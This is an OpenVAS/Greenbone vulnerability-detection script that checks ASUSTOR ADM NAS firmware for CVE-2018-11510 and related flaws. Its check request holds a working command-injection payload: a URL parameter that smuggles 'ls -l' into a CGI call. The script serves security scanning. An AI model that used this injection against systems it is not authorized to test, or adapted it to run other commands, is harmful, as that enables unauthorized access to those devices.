CPE = "cpe:/h:asustor:adm_firmware";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.141251" );
	script_version( "2021-06-22T02:00:27+0000" );
	script_tag( name: "last_modification", value: "2021-06-22 02:00:27 +0000 (Tue, 22 Jun 2021)" );
	script_tag( name: "creation_date", value: "2018-06-29 14:18:00 +0200 (Fri, 29 Jun 2018)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "severity_vector", value: "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2019-10-03 00:03:00 +0000 (Thu, 03 Oct 2019)" );
	script_cve_id( "CVE-2018-11509", "CVE-2018-11510", "CVE-2018-11511" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_name( "ASUSTOR ADM Multiple Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2018 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_asustor_adm_detect.sc" );
	script_mandatory_keys( "asustor_adm/detected" );
	script_tag( name: "summary", value: "ASUSTOR ADM is prone to multiple vulnerabilities." );
	script_tag( name: "insight", value: "ASUSTOR ADM is prone to multiple vulnerabilities:

  - Default credentials and remote access (CVE-2018-11509)

  - Unauthenticated Remote Command Execution (CVE-2018-11510)

  - Blind SQL Injections (CVE-2018-11511)" );
	script_tag( name: "vuldetect", value: "Sends a crafted HTTP GET request and checks the response." );
	script_tag( name: "affected", value: "ASUSTOR ADM 3.1.2.RHG1 and prior." );
	script_tag( name: "solution", value: "Update to the latest version." );
	script_xref( name: "URL", value: "https://packetstormsecurity.com/files/148919/ASUSTOR-NAS-ADM-3.1.0-Remote-Command-Execution-SQL-Injection.html" );
	script_xref( name: "URL", value: "https://github.com/mefulton/CVE-2018-11510" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!get_app_location( cpe: CPE, port: port, nofork: TRUE )){
	exit( 0 );
}
url = "/portal/apis/aggrecate_js.cgi?script=launcher%22%26ls%20-l%26%22";
if(http_vuln_check( port: port, url: url, pattern: "[drwx-]+.*root.*root", check_header: TRUE )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

